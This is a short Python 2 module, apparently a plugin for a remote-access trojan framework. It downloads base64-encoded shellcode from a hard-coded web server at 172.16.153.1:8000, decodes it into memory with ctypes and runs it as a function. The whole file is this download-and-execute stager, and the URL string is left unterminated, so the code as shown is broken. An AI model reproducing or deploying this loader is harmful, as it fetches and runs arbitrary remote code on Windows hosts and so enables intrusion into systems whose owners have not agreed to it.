import urllib2
import ctypes
import base64

def run(**args):
    url = "http://172.16.153.1:8000/shell.bin
    print "[*] In shellcode exec (Windows) module."
    # retrieve the shellcode from our web server
    response = urllib2.urlopen(url)

    # decode the shellcode from base64
    shellcode = base64.b64decode(response.read())

    # create a buffer in memory
    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

    # create a function pointer to our shellcode
    shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

    # call our shellcode
    shellcode_func()
    
    return str("Magic Happened?")

